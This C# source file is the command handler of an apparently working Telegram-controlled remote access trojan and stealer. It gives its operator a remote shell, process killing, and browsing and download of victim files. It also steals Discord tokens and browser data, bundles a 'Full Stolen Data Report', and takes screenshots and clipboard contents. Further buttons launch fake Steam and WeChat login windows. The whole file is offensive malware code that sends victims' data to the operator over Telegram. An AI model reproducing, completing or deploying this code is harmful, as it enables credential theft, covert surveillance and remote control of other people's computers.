using System;
using System.IO;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using TgMessage = Telegram.Bot.Types.Message;
using FinalBot.Stealers;
using FinalBot.Modules;
using System.Linq;

namespace FinalBot
{
    public class CommandHandler
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;

        public CommandHandler(ITelegramBotClient botClient, string adminId)
        {
            _botClient = botClient;
            _adminId = adminId;
        }

        public async Task HandleCommand(TgMessage message)
        {
            if (message.From?.Id.ToString() != _adminId) return;

            string text = message.Text ?? "";
            
            if (text == "/start" || text == "/panel")
            {
                await ShowAdminPanel(message.Chat.Id);
            }
            else if (text == "/help")
            {
                await ShowHelp(message.Chat.Id);
            }
            else if (text.StartsWith("/shell "))
            {
                string cmd = text.Substring(7).Trim();
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ *Running:* `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
                await _botClient.SendTextMessageAsync(message.Chat.Id, result, parseMode: ParseMode.Markdown);
            }
            else if (text.StartsWith("/kill "))
            {
                string pidStr = text.Substring(6).Trim();
                if (int.TryParse(pidStr, out int pid))
                {
                    string res = TaskManager.KillProcess(pid);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
            }
            else if (text.StartsWith("/djoin ") || text.StartsWith("/dstream "))
            {
                var parts = text.Split(' ', 3);
                if (parts.Length == 3)
                {
                    string action = text.StartsWith("/djoin") ? "join" : "stream";
                    string res = DiscordRemoteManager.LaunchDiscordBot(parts[1], parts[2], action);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Use: /djoin <token> <url>");
            }
            else if (text.StartsWith("/get "))
            {
                string path = text.Substring(5).Trim();
                if (System.IO.File.Exists(path))
                {
                    using var stream = System.IO.File.OpenRead(path);
                    await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(path)));
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
            }
            else 
            {
                await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ *Unknown command.* Use /help for available commands.");
            }
        }

        public async Task HandleCallbackQuery(CallbackQuery callbackQuery)
        {
            if (callbackQuery.Message is not { } message) return;
            string data = callbackQuery.Data ?? "";

            Console.WriteLine($"[C2] Callback received: {data}");

            switch (data)
            {
                case "file_manager":
                    var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                    await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, fmText, parseMode: ParseMode.Markdown, replyMarkup: fmMarkup);
                    break;
                case "proc_list":
                    string procs = TaskManager.GetProcessList();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                    break;
                case "panel_system":
                    await ShowSystemPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_work":
                    await ShowWorkPanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_spyware":
                    await ShowSpywarePanel(message.Chat.Id, message.MessageId);
                    break;
                case "panel_phishing":
                    await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                    break;
                case "back_to_main":
                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
                    break;
                case "screenshot":
                    await HandleScreenshot(message.Chat.Id);
                    break;
                case "clipboard":
                    await HandleClipboard(message.Chat.Id);
                    break;
                case "system_info":
                    await HandleSystemInfo(message.Chat.Id);
                    break;
                case "work_discord":
                    await HandleDiscordSteal(message.Chat.Id);
                    break;
                case "work_browsers":
                    await HandleBrowserSteal(message.Chat.Id);
                    break;
                case "full_report":
                    await HandleFullReport(message.Chat.Id);
                    break;
                case "phish_steam_login":
                    PhishManager.LaunchSteamLogin();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched Steam Login Phish*", parseMode: ParseMode.Markdown);
                    break;
                case "phish_steam_alert":
                    PhishManager.LaunchSteamAlert();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched Steam VAC Alert Phish*", parseMode: ParseMode.Markdown);
                    break;
                case "phish_wechat":
                    PhishManager.LaunchWeChatPhish();
                    await _botClient.SendTextMessageAsync(message.Chat.Id, "🎭 *Launched WeChat Phish*", parseMode: ParseMode.Markdown);
                    break;
                default:
                    if (data.StartsWith("fmd_"))
                    {
                        string pathInfo = data.Substring(4);
                        string realPath;
                        if (pathInfo.Length > 10 && !pathInfo.Contains("\\"))
                        {
                            realPath = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(pathInfo));
                        }
                        else
                        {
                            realPath = PathCache.Get(int.Parse(pathInfo)) ?? "";
                        }
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
                    }
                    else if (data.StartsWith("fmf_"))
                    {
                        int id = int.Parse(data.Substring(4));
                        string realPath = PathCache.Get(id);
                        if (!string.IsNullOrEmpty(realPath) && System.IO.File.Exists(realPath))
                        {
                            await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ *Uploading:* `{Path.GetFileName(realPath)}`", parseMode: ParseMode.Markdown);
                            using var stream = System.IO.File.OpenRead(realPath);
                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(realPath)));
                        }
                    }
                    else if (data.StartsWith("fmp_"))
                    {
                        var parts = data.Substring(4).Split('_');
                        int parentId = int.Parse(parts[0]);
                        int page = int.Parse(parts[1]);
                        string realPath = PathCache.Get(parentId) ?? "";
                        var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
                    }
                    else
                    {
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "Feature not yet implemented in C#.");
                    }
                    break;
            }
        }

        private async Task HandleScreenshot(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "📸 *Capturing screen...*");
            string? path = ScreenshotModule.TakeScreenshot(Path.GetTempPath());
            if (path != null)
            {
                using var stream = System.IO.File.OpenRead(path);
                await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
                System.IO.File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to take screenshot.");
        }

        private async Task HandleClipboard(long chatId)
        {
            string text = ClipboardModule.GetClipboardText();
            if (!string.IsNullOrEmpty(text))
            {
                await _botClient.SendTextMessageAsync(chatId, $"📋 *Clipboard:* \n`{text}`", parseMode: ParseMode.Markdown);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Clipboard is empty.");
        }

        private async Task HandleSystemInfo(long chatId)
        {
            string info = SystemInfoModule.GetSystemInfo();
            await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown);
        }

        private async Task HandleDiscordSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "💬 *Scanning Discord...*");
            var stealer = new DiscordStealer();
            string report = await stealer.Run();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Markdown);
        }

        private async Task HandleBrowserSteal(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🌍 *Scanning Browsers...*");
            var stealer = new BrowserStealer();
            string report = await stealer.RunAll();
            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Markdown);
        }

        private async Task HandleFullReport(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🚀 *Generating full report...*");
            string? zipPath = await ReportManager.CreateFullReport();
            if (zipPath != null)
            {
                using var stream = System.IO.File.OpenRead(zipPath);
                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 Full Stolen Data Report (C#)");
                System.IO.File.Delete(zipPath);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to generate report.");
        }

        private async Task ShowAdminPanel(long chatId, int messageId = 0)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💻 System", "panel_system"),
                    InlineKeyboardButton.WithCallbackData("💼 Work", "panel_work")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("👁️ Spyware", "panel_spyware"),
                    InlineKeyboardButton.WithCallbackData("🎭 Phishing", "panel_phishing")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📦 Full Report", "full_report")
                }
            });

            string info = $"🎮 *ADMIN PANEL*\n" +
                          $"🖥️ *PC:* {Environment.MachineName}\n" +
                          $"👤 *User:* {Environment.UserName}\n" +
                          $"🔋 *Status:* Online (C# Native)";

            if (messageId > 0)
            {
                await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
            }
            else
            {
                await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown, replyMarkup: markup);
            }
        }

        private async Task ShowSystemPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📁 Files", "file_manager"),
                    InlineKeyboardButton.WithCallbackData("📊 Processes", "proc_list")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🖥️ Info", "system_info"),
                    InlineKeyboardButton.WithCallbackData("📡 Wi-Fi", "wifi_info")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 *SYSTEM PANEL*", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowWorkPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💬 Discord", "work_discord"),
                    InlineKeyboardButton.WithCallbackData("📱 Telegram", "work_telegram")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🌍 Browsers", "work_browsers"),
                    InlineKeyboardButton.WithCallbackData("💰 Crypto", "work_crypto")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "💼 *WORK PANEL*", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowSpywarePanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("📸 Screenshot", "screenshot"),
                    InlineKeyboardButton.WithCallbackData("🎥 Screen Record", "record_video")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎙️ Microphone", "mic_record"),
                    InlineKeyboardButton.WithCallbackData("📋 Clipboard", "clipboard")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ SPYWARE PANEL", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowPhishingPanel(long chatId, int messageId)
        {
            var markup = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("🎮 Steam Login", "phish_steam_login"),
                    InlineKeyboardButton.WithCallbackData("🚨 Steam VAC", "phish_steam_alert")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("💬 WeChat", "phish_wechat")
                },
                new[]
                {
                    InlineKeyboardButton.WithCallbackData("⬅️ Back", "back_to_main")
                }
            });

            await _botClient.EditMessageTextAsync(chatId, messageId, "🎭 PHISHING PANEL", parseMode: ParseMode.Markdown, replyMarkup: markup);
        }

        private async Task ShowHelp(long chatId)
        {
            string help = "🆘 AVAILABLE COMMANDS\n\n" +
                          "/panel - Open admin panel\n" +
                          "/help - Show this help\n" +
                          "/send <path> - Download file from target\n";

            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Markdown);
        }
    }
}
